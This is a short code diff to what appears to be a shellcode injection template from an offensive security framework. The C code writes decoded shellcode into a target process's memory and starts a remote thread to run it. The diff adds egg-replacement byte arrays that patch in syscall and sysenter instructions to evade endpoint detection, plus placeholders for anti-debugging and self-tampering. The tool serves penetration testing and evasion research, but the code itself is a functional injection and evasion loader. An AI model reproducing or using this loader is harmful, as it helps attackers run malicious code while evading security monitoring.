@@ -52,16 +52,22 @@ int Inject()
 	    exit(1);
 	}
 
-    printf("[*] Writing virtual memory\n");
+    printf("[*] Writing virtual memory at %p\n", allocation_start);
 	status = NtWriteVirtualMemory(targetHandle, allocation_start, decoded, length, 0);
     if (status < 0){
 	    printf("[-] Memory writing failed\n");
 	    exit(1);
 	}
 
+//	Sleep(60*1000);
+
+
 	HANDLE targetThreadHandle = NULL;
     printf("[*] Creating thread\n");
 	NtCreateThreadEx(&targetThreadHandle, GENERIC_EXECUTE, NULL, targetHandle, allocation_start, NULL, FALSE, NULL, NULL, NULL, NULL);
+
+//	Sleep(60*1000);
+
     if (targetThreadHandle == NULL){
 	    printf("[-] Invalid Thread Handle\n");
 	    exit(1);
@@ -74,7 +80,16 @@ int Inject()
 
 int main(int argc, char** argv) {
 
-    // LoadLibrary(L"C:\\inceptor\\libs\\private\\x64\\syscall-detect.dll");
+    // LoadLibrary(L"C:\\Users\\d3adc0de\\Desktop\\Shared\\PenetrationTesting\\Git Personal Projects\\inceptor\\inceptor\\libs\\private\\x64\\syscall-detect.dll");
+
+    // unsigned char egg[] = { 0x77, 0x00, 0x00, 0x74, 0x77, 0x00, 0x00, 0x74 }; // w00tw00t
+	// unsigned char replace[] = { 0x0f, 0x05, 0x90, 0x90, 0xC3, 0x90, 0xCC, 0xCC }; // syscall; nop; nop; ret; nop; int3; int3
+
+    unsigned char egg[] = { 0x63, 0x0, 0x0, 0x69, 0x63, 0x0, 0x0, 0x69 }; // egg
+    unsigned char replace[] = { 0x0f, 0x34, 0x90, 0x90, 0xC3, 0x90, 0xCC, 0xCC };
+
+	//####SELF_TAMPERING####
+	(egg, replace);
 
     //####ANTIDEBUG####
     //####ARGS####
@@ -82,4 +97,5 @@ int main(int argc, char** argv) {
 
 	Inject();
 
+    return 0;
 }
